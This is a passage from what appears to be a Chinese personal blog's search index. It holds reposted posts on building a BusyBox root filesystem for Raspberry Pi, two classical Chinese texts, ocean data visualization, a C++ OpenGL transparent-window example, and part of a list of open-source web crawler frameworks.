这样我们这个文件系统启动就会执行rcS，可以在proc目录看到所有运行的文件 inittab：Linux在完成核内引导以后，就开始运行init程序(https://blog.csdn.net/u014089899/article/details/80622607) init.d/rcS：rcS是一个脚本文件，在inittab文件中本解析调用，用于配置Linux系统（https://blog.csdn.net/u013686019/article/details/26846571、 https://blog.csdn.net/weixin_30839881/article/details/97608919?utm_medium=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.edu_weight&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.edu_weight） 执行mount –a 命令后，将挂接proc、tmpfs文件系统 写成mount –a 它会依赖于etc/fstab ,根据fstab的指示来挂载根文件系统 profile：/etc/profile文件的改变会涉及到系统的环境（https://www.cnblogs.com/lh03061238/p/9952659.html） 4.C库lib ---------------------------------------------------------------------- 进入到编译busybox的C库，路径是/tools-master/arm-bcm2708/gcc-linaro-arm-linux-gnueabihf-raspbian-x64/arm-linux-gnueabihf/libc/lib/arm-linux-gnueabihf ![在这里插入图片描述](20210505124020177.png) 交叉编译工具链里面需要的文件动态链接到\\_install的lib下 ![在这里插入图片描述](20210505124341931.png) ![在这里插入图片描述](20210505124449130.png) 四、移植到sd卡 与内核移植一致，首先在/busybox-1.33.0下创建mnt/ext4用来挂载的文件夹， 1234sudo mount /dev/sdb2 mnt/ext4sudo cp -r _install/* mnt/ext4 -dsudo umount /mnt/ext4 注意：这里必须将文件夹整体拷贝进SD卡，不能在拷贝之后在添加boot等文件夹，否则会出现一些问题,可能的原因是，第一次启动时，已经将文件系统烧写进内存当中,再次修改导致死机，文件系统做的任何修改都不行要整体拷贝 本文转自 https://blog.csdn.net/qq_19606023/article/details/116423827，如有侵权，请联系删除。","tags":"树莓派"},{"title":"黄帝阴符经","url":"/20220613/huang-di-yin-fu-jing/","text":"※《阴符经》(黄帝阴符经)原文 | 道家 ※上篇 观天之道，执天之行，尽矣。故天有五贼，见之者昌。五贼在乎心，施行于天。宇宙在乎手，万化生乎身。天性，人也；人心，机也。立天之道，以定人也。天发杀机，移星易宿；地发杀机，龙蛇起陆；人发杀机，天地反覆；天人合发，万变定基。性有巧拙，可以伏藏。九窍之邪，在乎三要，可以动静。火生于木，祸发必克；奸生于国，时动必溃。知之修炼，谓之圣人。 ※中篇 天生天杀，道之理也。天地，万物之盗；万物，人之盗；人，万物之盗。三盗既宜，三才既安。故曰:食其时，百骸理；动其机，万化安。人知其神而神，不知其不神之所以神也。日月有数，大小有定，圣功生焉，神明出焉。其盗机也，天下莫能见，莫能知也。君子得之固躬，小人得之轻命。 ※下篇 瞽者善听，聋者善视。绝利一源，用师十倍。三返昼夜，用师万倍。心生于物，死于物，机在于目。天之无恩而大恩生。迅雷烈风，莫不蠢然。至乐性余，至静性廉。天之至私，用之至公。禽之制在炁。生者死之根，死者生之根。恩生于害，害生于恩。愚人以天地文理圣，我以时物文理哲。人以愚虞圣，我以不愚虞圣；人以奇期圣，我以不奇期圣。故曰：沉水入火，自取灭亡。自然之道静，故天地万物生。天地之道浸，故阴阳胜。阴阳相推，而变化顺矣。是故圣人知自然之道不可违，因而制之至静之道。律历所不能契。爰有奇器，是生万象，八卦甲子，神机鬼藏。阴阳相胜之术，昭昭乎进于象矣。 http://www.quanxue.cn/CT_DaoJia/YinFu/YinFu01.html","tags":"国学"},{"title":"海洋数据三维可视化","url":"/20220613/hai-yang-shu-ju-san-wei-ke-shi-hua/","text":"海洋数据可视化平台指通过海洋信息三维可视化技术，实现海洋信息数据的可视化。海洋数据可视化是科学管理海洋数据的重要组成部分，它能够将无法直接查看的数据以直观的图形方式展示出來，提高海洋数据研究利用能力，能提髙数据访问效率及安全性。 海洋数据三维可视化平台建立在海、陆、空多维立体信息采集系统基础上，实现了海洋环境类、自然地理类、海洋管理类等各种信息的可视化表达、综合查询、空间叠加分析，为海洋的数字化、可视化、透明化表达提供了崭新的海洋信息立体展现形式，为深入认识海洋、开发海洋、管理海洋开辟了新的途径和手段。 海洋数据三维可视化平台具备海洋环境立体综合监测和海上突发事故应急救助能力。利用北斗卫星定位技术、海洋大数据分析技术、海洋卫星遥感及计算机信息技术，将全球涉渔船舶实时监控与指挥调度、海洋环境实时动态与船舶行为数据有机结合。配合丰富的网络资源、无线网络、ARN自适应无线传输和卫星通信技术等，为管理部门提供跨地域的日常生产作业实时视频和各种报警信号的远程采集、传输、储存、处理与转播，实现海域管理可视化、智能化。","tags":""},{"title":"劝学-荀子","url":"/20220613/quan-xue-xun-zi/","text":"※劝学 荀子 〔先秦〕 君子曰：学不可以已。 青，取之于蓝，而青于蓝；冰，水为之，而寒于水。木直中绳，輮以为轮，其曲中规。虽有槁暴，不复挺者，輮使之然也。故木受绳则直，金就砺则利，君子博学而日参省乎己，则知明而行无过矣。 故不登高山，不知天之高也；不临深溪，不知地之厚也；不闻先王之遗言，不知学问之大也。干、越、夷、貉之子，生而同声，长而异俗，教使之然也。诗曰：“嗟尔君子，无恒安息。靖共尔位，好是正直。神之听之，介尔景福。”神莫大于化道，福莫长于无祸。 吾尝终日而思矣，不如须臾之所学也；吾尝跂而望矣，不如登高之博见也。登高而招，臂非加长也，而见者远；顺风而呼，声非加疾也，而闻者彰。假舆马者，非利足也，而致千里；假舟楫者，非能水也，而绝江河。君子生非异也，善假于物也。 南方有鸟焉，名曰蒙鸠，以羽为巢，而编之以发，系之苇苕，风至苕折，卵破子死。巢非不完也，所系者然也。西方有木焉，名曰射干，茎长四寸，生于高山之上，而临百仞之渊，木茎非能长也，所立者然也。蓬生麻中，不扶而直；白沙在涅，与之俱黑。兰槐之根是为芷，其渐之滫，君子不近，庶人不服。其质非不美也，所渐者然也。故君子居必择乡，游必就士，所以防邪辟而近中正也。 物类之起，必有所始。荣辱之来，必象其德。肉腐出虫，鱼枯生蠹。怠慢忘身，祸灾乃作。强自取柱，柔自取束。邪秽在身，怨之所构。施薪若一，火就燥也，平地若一，水就湿也。草木畴生，禽兽群焉，物各从其类也。是故质的张，而弓矢至焉；林木茂，而斧斤至焉；树成荫，而众鸟息焉。醯酸，而蜹聚焉。故言有招祸也，行有招辱也，君子慎其所立乎！ 积土成山，风雨兴焉；积水成渊，蛟龙生焉；积善成德，而神明自得，圣心备焉。故不积跬步，无以至千里；不积小流，无以成江海。骐骥一跃，不能十步；驽马十驾，功在不舍。锲而舍之，朽木不折；锲而不舍，金石可镂。蚓无爪牙之利，筋骨之强，上食埃土，下饮黄泉，用心一也。蟹六跪而二螯，非蛇鳝之穴无可寄托者，用心躁也。 是故无冥冥之志者，无昭昭之明；无惛惛之事者，无赫赫之功。行衢道者不至，事两君者不容。目不能两视而明，耳不能两听而聪。螣蛇无足而飞，鼫鼠五技而穷。《诗》曰：“尸鸠在桑，其子七兮。淑人君子，其仪一兮。其仪一兮，心如结兮！”故君子结于一也。 昔者瓠巴鼓瑟，而流鱼出听；伯牙鼓琴，而六马仰秣。故声无小而不闻，行无隐而不形 。玉在山而草木润，渊生珠而崖不枯。为善不积邪？安有不闻者乎？ 学恶乎始？恶乎终？曰：其数则始乎诵经，终乎读礼；其义则始乎为士，终乎为圣人， 真积力久则入，学至乎没而后止也。故学数有终，若其义则不可须臾舍也。为之，人也；舍 之，禽兽也。故书者，政事之纪也；诗者，中声之所止也；礼者，法之大分，类之纲纪也。 故学至乎礼而止矣。夫是之谓道德之极。礼之敬文也，乐之中和也，诗书之博也，春秋之微 也，在天地之间者毕矣。 君子之学也，入乎耳，箸乎心，布乎四体，形乎动静。端而言，蝡而动，一可以为法则。小人之学也，入乎耳，出乎口；口耳之间，则四寸耳，曷足以美七尺之躯哉！古之学者为己，今之学者为人。君子之学也，以美其身；小人之学也，以为禽犊。故不问而告谓之傲，问一而告二谓之囋。傲、非也，囋、非也；君子如向矣。 学莫便乎近其人。礼乐法而不说，诗书故而不切，春秋约而不速。方其人之习君子之说，则尊以遍矣，周于世矣。故曰：学莫便乎近其人。 学之经莫速乎好其人，隆礼次之。上不能好其人，下不能隆礼，安特将学杂识志，顺诗书而已耳。则末世穷年，不免为陋儒而已。将原先王，本仁义，则礼正其经纬蹊径也。若挈裘领，诎五指而顿之，顺者不可胜数也。不道礼宪，以诗书为之，譬之犹以指测河也，以戈舂黍也，以锥餐壶也，不可以得之矣。故隆礼，虽未明，法士也；不隆礼，虽察辩，散儒也。 问楛者，勿告也；告楛者，勿问也；说楛者，勿听也。有争气者，勿与辩也。故必由其道至，然后接之；非其道则避之。故礼恭，而后可与言道之方；辞顺，而后可与言道之理；色从而后可与言道之致。故未可与言而言，谓之傲；可与言而不言，谓之隐；不观气色而言，谓瞽。故君子不傲、不隐、不瞽，谨顺其身。诗曰：“匪交匪舒，天子所予。”此之谓也。 百发失一，不足谓善射；千里蹞步不至，不足谓善御；伦类不通，仁义不一，不足谓善学。学也者，固学一之也。一出焉，一入焉，涂巷之人也；其善者少，不善者多，桀纣盗跖也；全之尽之，然后学者也。 君子知夫不全不粹之不足以为美也，故诵数以贯之，思索以通之，为其人以处之，除其害者以持养之。使目非是无欲见也，使耳非是无欲闻也，使口非是无欲言也，使心非是无欲虑也。及至其致好之也，目好之五色，耳好之五声，口好之五味，心利之有天下。是故权利不能倾也，群众不能移也，天下不能荡也。生乎由是，死乎由是，夫是之谓德操。德操然后能定，能定然后能应。能定能应，夫是之谓成人。天见其明，地见其光，君子贵其全也。","tags":"国学"},{"title":"共产党宣言","url":"/20220613/gong-chan-dang-xuan-yan/","text":" 个人笔记，仅供个人查阅","tags":""},{"title":"如何制作透明背景的OpenGL渲染上下文？","url":"/20220613/ru-he-zhi-zuo-tou-ming-bei-jing-de-opengl-xuan-ran-shang-xia-wen/","text":"转载自腾讯云社区 这是一个古老的问题，但由于新版本的Windows有合成和对opengl的支持，正如datenwolf所暗示的那样，我们可以使用一些特殊的调料来实现这一点。尽管这对于DirectX来说也是微不足道的(如图所示)微软确实在opengl上下文中添加了合成提示。耶，反垄断的恐惧！ 因此，您必须使用指定alpha通道的像素格式创建一个opengl上下文，并且它应该使用合成(第82行)。然后，使用DwmApi.h例程启用一个模糊窗口(第179行)，其中指定了一个完全无效的区域，这将模糊任何内容并使窗口保持透明。(您需要在窗口类上指定一个black+transparent笔刷！奇怪！)然后，您实际上只是使用opengl，就像您习惯使用它一样。在事件循环中，只要有机会，您就可以绘制和交换缓冲区(第201行)，并记住启用GL_BLEND！😃 请查看/fork https://gist.github.com/3644466，或者只查看基于OP自己的答案的以下代码片段，而不是使用此技术(您可以将其放在一个空项目中)： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207#define _WIN32_WINNT 0x0500#include &lt;windows.h&gt;#include &lt;windowsx.h&gt;#include &lt;GL/gl.h&gt;#include &lt;GL/glu.h&gt;#include &lt;dwmapi.h&gt;#pragma comment (lib, &quot;opengl32.lib&quot;)#pragma comment (lib, &quot;glu32.lib&quot;)#pragma comment (lib, &quot;dwmapi.lib&quot;)#include &lt;assert.h&gt;#include &lt;tchar.h&gt;#ifdef assert#define verify(expr) if(!expr) assert(0)#else verify(expr) expr#endifconst TCHAR szAppName[]=_T(&quot;TransparentGL&quot;);const TCHAR wcWndName[]=_T(&quot;TransparentGL&quot;);HDC hDC;HGLRC m_hrc;int w = 240;int h = 240;BOOL initSC() &#123; glEnable(GL_ALPHA_TEST); glEnable(GL_DEPTH_TEST); glEnable(GL_COLOR_MATERIAL); glEnable(GL_LIGHTING); glEnable(GL_LIGHT0); glEnable(GL_BLEND); glBlendFunc(GL_SRC_ALPHA, GL_ONE_MINUS_SRC_ALPHA); glClearColor(0, 0, 0, 0); return 0;&#125;void resizeSC(int width,int height) &#123; glViewport(0,0,width,height); glMatrixMode(GL_PROJECTION); glLoadIdentity(); glMatrixMode(GL_MODELVIEW ); glLoadIdentity();&#125;BOOL renderSC() &#123; glClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT ); glPushMatrix(); glColor3f(0, 1, 1); glBegin(GL_TRIANGLES); // Drawing Using Triangles glColor3f(1.0f,0.0f,0.0f); // Set The Color To Red glVertex3f( 0.0f, 1.0f, 0.0f); // Top glColor3f(0.0f,1.0f,0.0f); // Set The Color To Green glVertex3f(-1.0f,-1.0f, 0.0f); // Bottom Left glColor3f(0.0f,0.0f,1.0f); // Set The Color To Blue glVertex3f( 1.0f,-1.0f, 0.0f); // Bottom Right glEnd(); glPopMatrix(); glFlush(); return 0;&#125;BOOL CreateHGLRC(HWND hWnd) &#123; PIXELFORMATDESCRIPTOR pfd = &#123; sizeof(PIXELFORMATDESCRIPTOR), 1, // Version Number PFD_DRAW_TO_WINDOW | // Format Must Support Window PFD_SUPPORT_OPENGL | // Format Must Support OpenGL PFD_SUPPORT_COMPOSITION | // Format Must Support Composition PFD_DOUBLEBUFFER, // Must Support Double Buffering PFD_TYPE_RGBA, // Request An RGBA Format 32, // Select Our Color Depth 0, 0, 0, 0, 0, 0, // Color Bits Ignored 8, // An Alpha Buffer 0, // Shift Bit Ignored 0, // No Accumulation Buffer 0, 0, 0, 0, // Accumulation Bits Ignored 24, // 16Bit Z-Buffer (Depth Buffer) 8, // Some Stencil Buffer 0, // No Auxiliary Buffer PFD_MAIN_PLANE, // Main Drawing Layer 0, // Reserved 0, 0, 0 // Layer Masks Ignored &#125;; HDC hdc = GetDC(hWnd); int PixelFormat = ChoosePixelFormat(hdc, &amp;pfd); if (PixelFormat == 0) &#123; assert(0); return FALSE ; &#125; BOOL bResult = SetPixelFormat(hdc, PixelFormat, &amp;pfd); if (bResult==FALSE) &#123; assert(0); return FALSE ; &#125; m_hrc = wglCreateContext(hdc); if (!m_hrc)&#123; assert(0); return FALSE; &#125; ReleaseDC(hWnd, hdc); return TRUE;&#125;LRESULT CALLBACK WindowFunc(HWND hWnd,UINT msg, WPARAM wParam, LPARAM lParam) &#123; PAINTSTRUCT ps; switch(msg) &#123; case WM_CREATE: break; case WM_DESTROY: if(m_hrc) &#123; wglMakeCurrent(NULL, NULL); wglDeleteContext(m_hrc) ; &#125; PostQuitMessage(0) ; break; default: return DefWindowProc(hWnd,msg,wParam,lParam); &#125; return 0;&#125;int WINAPI _tWinMain(HINSTANCE hThisInst, HINSTANCE hPrevInst, LPSTR str,int nWinMode) &#123; WNDCLASSEX wc; memset(&amp;wc, 0, sizeof(wc)); wc.cbSize = sizeof(WNDCLASSEX); wc.hIconSm = LoadIcon(NULL, IDI_APPLICATION); wc.style = CS_HREDRAW | CS_VREDRAW; wc.lpfnWndProc = (WNDPROC)WindowFunc; wc.cbClsExtra = 0; wc.cbWndExtra = 0; wc.hInstance = hThisInst; wc.hIcon = LoadIcon(NULL, IDI_APPLICATION); wc.hCursor = LoadCursor(NULL, IDC_ARROW); wc.hbrBackground = (HBRUSH)CreateSolidBrush(0x00000000); wc.lpszClassName = szAppName; if(!RegisterClassEx(&amp;wc)) &#123; MessageBox(NULL, _T(&quot;RegisterClassEx - failed&quot;), _T(&quot;Error&quot;), MB_OK | MB_ICONERROR); return FALSE; &#125; HWND hWnd = CreateWindowEx(WS_EX_APPWINDOW, szAppName, wcWndName, WS_VISIBLE | WS_POPUP, 200, 150, w, h, NULL, NULL, hThisInst, NULL); if(!hWnd) &#123; MessageBox(NULL, _T(&quot;CreateWindowEx - failed&quot;), _T(&quot;Error&quot;), MB_OK | MB_ICONERROR); return FALSE; &#125; DWM_BLURBEHIND bb = &#123;0&#125;; HRGN hRgn = CreateRectRgn(0, 0, -1, -1); bb.dwFlags = DWM_BB_ENABLE | DWM_BB_BLURREGION; bb.hRgnBlur = hRgn; bb.fEnable = TRUE; DwmEnableBlurBehindWindow(hWnd, &amp;bb); CreateHGLRC(hWnd); HDC hdc = GetDC(hWnd); wglMakeCurrent(hdc, m_hrc); initSC(); resizeSC(w, h); ReleaseDC(hWnd, hdc); MSG msg; while(1) &#123; if (PeekMessage(&amp;msg, NULL, 0, 0, PM_REMOVE)) &#123; TranslateMessage(&amp;msg); DispatchMessage(&amp;msg); &#125; else &#123; HDC hdc = GetDC(hWnd); wglMakeCurrent(hdc, m_hrc); renderSC(); SwapBuffers(hdc); ReleaseDC(hWnd, hdc); &#125; &#125; return (FALSE);&#125;","tags":"opengl c++"},{"title":"50种最棒的开源爬虫框架/项目","url":"/20220609/50-chong-zui-bang-de-kai-yuan-pa-chong-kuang-jia-xiang-mu/","text":"作者：Prowebscraper 博客 译者：Rays 摘要： 说起爬虫框架，你可能会马上脱口而出：「 Scrapy 或者 Pyspider」，甚至你可能认为只有 Python 才能爬虫。其实还有很多好用的开源爬虫框架，也绝不仅仅只有 Python 才能写爬虫，大多数热门语言都可以做。 总之，开源 Web 爬虫纷繁多样，下面按照所用程语言，罗列五十种最好的开源爬虫框架，每一个各具特长，适用于不同场景和用户需求。下面来一睹为快。 ※Python 编写的开源 Web 爬虫 ※1. Scrapy 实现语言：Python GitHub Star 数：28660 官方支持链接 简介： Scrapy 是一种高速的高层 Web 爬取和 Web 采集框架，可用于爬取网站页面，并从页面中抽取结构化数据。 Scrapy 的用途广泛，适用于从数据挖掘、监控到自动化测试。 Scrapy 设计上考虑了从网站抽取特定的信息，它支持使用 CSS 选择器和 XPath 表达式，使开发人员可以聚焦于实现数据抽取。 对于熟悉 Python 的开发人员，只需几分钟就能建立并运行 Scrapy。 支持运行在 Linux、Mac OS 和 Windows 系统上。 特性： 内置支持从 HTML 和 XML 抽取数据、使用扩展的 CSS 选择器（Selector）和 XPath 表达式等特性。 支持以多种格式（JSON、CSV、XML）生成输出。 基于 Twisted 构建。 稳健的支持，自动检测编码方式。 快速，功能强大。 – 官方文档：https://docs.scrapy.org/en/latest/ – 官方网站：https://scrapy.org/ ※2. Cola 实现语言：Python GitHub Star 数：1274 官方支持链接 简介： Cola 是一种高层分布式爬取框架，实现从网站爬取网页，并从中抽取结构化数据。 它提供了一种实现目标数据获取的简单且灵活的方式。 用户只需要编写其中一部分代码，就可在本地和分布式环境下运行。 特性： 高层分布式爬取框架。 简单且高速。 灵活。 – 官方文档：https://github.com/chineking/cola – 官方网站：https://pypi.org/project/Cola/ ※3. Crawley 实现语言 Python GitHub Star 数： 144 官方支持链接 简介： Crawley 是一种 Python 爬取和采集框架，意在简化开发人员从 Web 网页抽取数据到数据库等结构化存储中。 特性： 基于 Eventlet 构建的高速 Web 爬虫。 支持 MySQL、PostgreSQL、Oracle、Sqlite 等关系数据库引擎。 支持 MongoDB、CouchDB 等 NoSQL 数据库（最新特性！）。 支持导出数据为 JSON、XML 和 CSV 格式（最新特性！）。 命令行工具。 支持开发人员使用自己喜好的工具，例如 XPath 或 Pyquery（一种类似于 JQuery 的 Python 软件库）等。 支持 Cookie 处理器（Handler）。 – 官方文档：https://pythonhosted.org/crawley/ – 官方网站：http://project.crawley-cloud.com/ ※4. MechanicalSoup 实现语言： Python GitHub Star 数： 2803 官方支持链接 简介： MechanicalSoup 是一种设计模拟人类使用 Web 浏览器行为的 Python 软件库，它基于解析软件库 BeautifulSoup 构建。 如果开发人员需要从单个站点采集数据，或是不需要大量数据采集，那么使用 MechanicalSoup 是一种简单高效的方法。 MechanicalSoup 自动存储和发送 Cookie、跟踪重定向、支持链接跟随和提交表单。 特性： 轻量级。 支持 Cookie 处理器。 – 官方文档： https://mechanicalsoup.readthedocs.io/en/stable/ – 官方网站：https://mechanicalsoup.readthedocs.io/ ※5. PySpider 实现语言： Python GitHub Star 数： 11803 官方支持链接 简介： PySpider 是一种 Python 编写的强大 Web 爬虫。 它支持 JavaScript 网页，并具有分布式架构。 PySpider 支持将爬取数据存储在用户选定的后台数据库，包括**MySQL**, MongoDB, Redis, SQLite, **Elasticsearch**等。 支持开发人员使用 RabbitMQ、Beanstalk 和 Redis 等作为消息队列。 特性： 提供强大 Web 界面，具有脚本编辑器、任务监控、项目管理器和结果查看器。 支持对重度 Ajax 网站的爬取。 易于实现适用、快速的爬取。 – 官方文档： http://docs.pyspider.org/ – 官方网站：https://github.com/binux/pyspider ※6. Portia 实现语言： Python GitHub Star 数： 6250 官方支持链接 ![](data:image/svg+xml;utf8,) 简介： Portia 是由 Scrapinghub 创建的一种可视化爬取工具，它不需要用户具有任何程序开发知识。 如果用户并非开发人员，最好直接使用 Portia 实现 Web 爬取需求。 用户无需任何安装就可免费试用 Portia，只需要在 Scrapinghub 注册一个账户，就可使用托管版本。 即便用户没有编程技能，在 Portia 中创建爬虫并抽取 Web 内容也是非常易于实现的。 用户无需安装任何程序，因为 Portia 是运行在 Web 页面上的。 用户可以使用 Portia 的基本点击工具标注需要爬取的数据，然后 Portia 就会根据这些标注理解如何爬取类似页面中的数据。 一旦检测到需要爬取的页面，Portia 会形成一个用户已创建结构的实例。 特性： 通过记录并回放用户在页面上的操作，实现点击、拖动和等待等动作。 Portia 可以很好地爬取基于 Ajax 构建的网站（基于 Splash），也适用于爬取 Backbone、Angular 和 Ember 等重度 JavsScript 框架。 – 官方文档：https://portia.readthedocs.io/en/latest/index.html – 官方网站： https://github.com/scrapinghub/portia ※7. Beautifulsoup 实现语言： Python 官方支持链接 ![](data:image/svg+xml;utf8,) 简介： Beautiful Soup 一种设计用于实现 Web 爬取等快速数据获取项目的 Python 软件库。 它在设计上处于 HTML 或 XML 解析器之上，提供用于迭代、搜索和修改解析树等功能的 Python 操作原语。往往能为开发人员节省数小时乃至数天的工作。 特性： Beautiful Soup 自动将输入文档转换为 Unicode 编码，并将输出文档转换为 UTF-8 编码。 Beautiful Soup 处于一些广为采用的 Python 解析器（例如，lxml和html5lib）之上，支持用户尝试使用多种不同的解析策略，并在速度和灵活性上做出权衡。 – 官方文档：https://www.crummy.com/software/BeautifulSoup/bs4/doc/ – 官方网站： https://www.crummy.com/software/BeautifulSoup/ ※8. Spidy 爬虫 实现语言： Python GitHub Star 数： 152 官方支持链接 简介： Spidy 是一种从命令行运行的 Web 爬虫。易于使用。用户只需提供 Web 网页的 URL 链接，Spidy 就可以开始爬取！Spidy 无疑是一种整体爬取 Web 的简单有效的方式。 Spidy 使用 Python 请求查询 Web 页面，并使用 lxml 抽取页面中的所有链接。非常简单！ 特性： 错误处理。 跨平台兼容性。 频繁时间戳日志。 可移植性。 用户友好的日志。 保存 Web 页面。 支持文件压缩。 – 官方文档：https://github.com/rivermont/spidy – 官方网站： http://project.crawley-cloud.com/ ※9. Garb 实现语言： Python GitHub Star 数： 1627 官方支持链接 简介： Grab 是一种用于构建爬虫的 Python 框架。 使用 Grab 可构建出各种复杂度的 Web 爬虫，从只有五行代码的脚本，到可处理百万量级 Web 页面的复杂异步爬虫。 Grab 提供了执行网络请求、处理接收内容的 API。例如，实现与 HTML 文档的 DOM 树进行交互。 特性： 支持 HTTP 和 SOCKS 代理，可使用也可不使用认证。 自动字符集检测。 强大的 API，支持使用 XPath 查询从 HTML 文档的 DOM 树中抽取数据。 自动 Cookie（或会话）支持。 – 官方文档：https://grablib.org/en/latest/ – 官方网站： https://github.com/lorien/grab ※Java 编写的开源 Web 爬虫 ※10. Apache Nutch 实现语言： Java GitHub Star 数： 1743 官方支持链接 简介： Apache Nutch 是一种高度可扩展、可伸缩的开源 Web 爬虫软件项目。 如果要列出最好的开源 Web 爬虫列表，Apache Nutch 无疑金榜题名。 作为一种用于数据挖掘的高度可扩展、可伸缩的开源代码 Web 数据抽取软件项目，Apache Nutch 得到了广泛的使用。 Nutch 支持单机运行，但是在 Hadoop 集群上运行可最大化地发挥其强大能力。 全球范围内很多数据分析人员和科研人员、应用开发人员和 Web 文本挖掘工程师都在使用 Apache Nutch。 Apache Nutch 是一种 Java 编写的跨平台解决方案。 特性： 默认情况下，爬取数据和分析数据是独立的过程。 广泛支持多种文档格式，包括纯文本、HTML/XHTML+XML、XML、PDF、ZIP 等。 使用 XPath 和命名空间实现映射。 通过 Hadoop 支持分布式文件系统。 链接图形式的数据库。 支持 NTLM 认证。 – 官方文档： https://wiki.apache.org/nutch/ – 官方网站： http://nutch.apache.org/ ※11. Heritrix 实现语言： Java GitHub Star 数： 1236 官方支持链接 简介： 在使用 Java 编写的免费开源 Web 爬虫中，Heritrix 是其中一种得到广泛使用的工具。事实上，它是一种可扩展、Web 规模、存档质量（archival-quality）的 Web 爬取项目。 Heritrix 是一种扩展能力和性能很好的解决方案，支持用户即刻爬取并归档一组网站。此外，它在设计上考虑了 robots.txt 禁止规则和 META 机器人标签。 Heritrix 可运行在 Linux/Unix 和 Windows 系统上。 特性： HTTP 认证。 NTLM 认证。 链接抽取中的 XSL 转换。 独立于搜索引擎。 是一种成熟并稳定的平台。 高度可配置。 支持在任一机器上运行。 – 官方文档： https://github.com/internetarchive/heritrix3/wiki/Heritrix%203.0%20and%203.1%20User%20Guide – 官方站： https://github.com/internetarchive/heritrix3b ※12. ACHE 爬虫 实现语言： Java GitHub Star 数： 154 官方支持链接 ![](data:image/svg+xml;utf8,) 简介： ACHE 是一种专用于特定用途的 Web 爬虫。 ACHE 爬取满足特定标准的 Web 页面。例如，属于特定领域并包含用户指定模式的页面。 不同于通用爬虫，ACHE 使用页面分类器遴选特定领域中的相关和无关页面。 页面分类器可以是基本的正则表达式（例如，匹配所有包含给定单词的页面），也可以基于机器学习的分类模型。ACHE 也可以自动学习如何对链接做优先处理，实现高效地定位相关内容，避免检索无关的页面内容。 特性： 对固定网站列表的正常爬取。 通过自动链接优先处理，发现并爬取新的相关网站。 可配置不同类型的页面分类器（例如，机器学习、正则表达式等）。 持续重新爬取站点，实现页面更新的发现。 使用 ElasticSearch 对爬取页面做索引。 实时搜索爬取页面的 Web 接口。 用于监控爬虫的 REST API 和基于 Web 的用户接口。 使用 TOR 代理爬取隐含服务。 – 官方文档： http://ache.readthedocs.io/en/latest/ – 官方网站： https://github.com/ViDA-NYU/ache ※13. Crawler4j 实现语言： Java GitHub Star 数： 3039 官方支持链接 简介： crawler4j 是一种 Java 编写的开源 Web 爬虫，提供了爬取 Web 网站的基本接口。 开发人员可以使用 crawler4j 在数分钟内建立一个多线程 Web 爬虫。 – 官方文档： https://github.com/yasserg/crawler4j – 官方网站： https://github.com/yasserg/crawler4j ※14. Gecco 实现语言： Java GitHub Star 数： 1245 官方支持链接 简介： Gecco 是一种使用 Java 开发的轻量级 Web 爬虫，易于使用。 Gecco 集成了 jsoup、httpclient、fastjson、spring、htmlunit、redission 等优秀框架。用户只需要配置一系列 jQuery 风格选择器，就能很快地建立一个爬虫。 Gecco 框架具有优秀的扩展能力。框架基于一些开放式和封闭式设计原则，对改进封闭，对扩展开放。 特性： 易于使用，使用 jQuery 风格选择器抽取元素。 支持页面中的异步 Ajax 请求。 支持页面 JavaScript 变量抽取。 使用 Redis 实现分布式爬取（参见 gecco-redis 文档）。 支持使用 Spring 开发业务逻辑（参见 gecco-spring 文档）。 支持 htmlunit 扩展（参见 gecco-htmlunit 文档）。 支持多种扩展机制。 支持下载 UserAgent 的随机选择。 支持下载代理服务器的随机选取。 – 官方文档： https://github.com/xtuhcy/gecco – 官方网站： https://github.com/xtuhcy/gecco ※15. BUbiNG 实现语言： Java GitHub Star 数：24 官方支持链接 简介： BUbiNG 令人惊喜，它可称为下一代的开源 Web 爬虫。BUbiNG 是一种 Java 开发的完全分布式爬虫（无需中央协调），每秒可爬取数千个网页，并支持采集大规模数据集。 BUbiNG 的分布式是基于高速协议实现的，因此可以获得非常高的通量。 BUbiNG 提供对海量数据的大规模爬取。它完全可配置、易于扩展，并可集成垃圾信息检测。 特性： 高度并行。 完全分布式。 使用 JAI4J。JAI4J 是一种基于 JGroups 实现的瘦功能层，实现任务指派。 （当前）使用剥离网页的指纹，检测近似的重复内容。 快速。 大规模爬取。 – 官方文档： http://law.di.unimi.it/software/bubing-docs/index.html – 官方网站： http://law.di.unimi.it/software.php#bubing ※16. Narconex 实现语言：Java 官方支持链接 简介： 对于寻求可满足企业级需求的开源 Web 爬虫的用户而言，Narconex 是一种很好的工具。 Norconex 支持用户爬取任何 Web 内容。用户可以独立运行这种全功能数据采集器，或是将其集成在自己的应用中。 支持所有操作系统。可在具有一般容量的单体服务器上爬取数百万信息。此外，Narconex 提供多种内容和元数据操作特性，还可以抽取页面中特定的图像。 特性： 多线程。 支持按各种计划任务，抽取不同时间段的数据。 从 HTML、Word、PDF 等多种文件格式中抽取文本内容。 抽取文档相关的元数据。 支持抽取使用用 JavaScript 渲染的页面。 检测语言。 支持翻译。 可配置爬取速度。 可检测发生修改或已被删除的文档。 支持使用外部命令分析或操作文档。 – 官方文档： http://www.norconex.com/collectors/collector-http/getting-started – 官方网站： http://www.norconex.com/collectors/collector-http/ ※17. WebSPHINX 实现语言： Java 当前尚不提供官方支持。 ![](data:image/svg+xml;utf8,) 简介： WebSphinix 是一种非常易于使用的可定制 Web 爬虫。它设计用于高级 Web 用户和 Java 编程人员，支持他们自动爬取小部分 Web。 WebSphinix 数据抽取解决方案也提供了一种全面的 Java 类库和交互式软件开发环境。WebSphinix 包括两部分：爬虫基准测试（Crawler Workbench），WebSPHINX 类库。 爬虫基准测试提供了很好的用户图形接口，支持用户配置并控制定制的 Web 爬虫。 WebSPHINX 类库为使用 Java 编写 Web 爬虫提供支持。 WebSphinix 支持运行在 Windows、Linux、Mac 和 Android IOS 上。 特性： 以图的方式可视化 Web 页面采集。 将多个页面组合为单个文档，以供查看和打印。 支持抽取所有满足设定模式的文本。 支持 HTML 解析。 支持 robot.txt 禁止标准。 通用 HTML 转换。 多线程 Web 页面检索。 – 官方文档： https://www.cs.cmu.edu/~rcm/websphinx/doc/index.html – 官方网站： 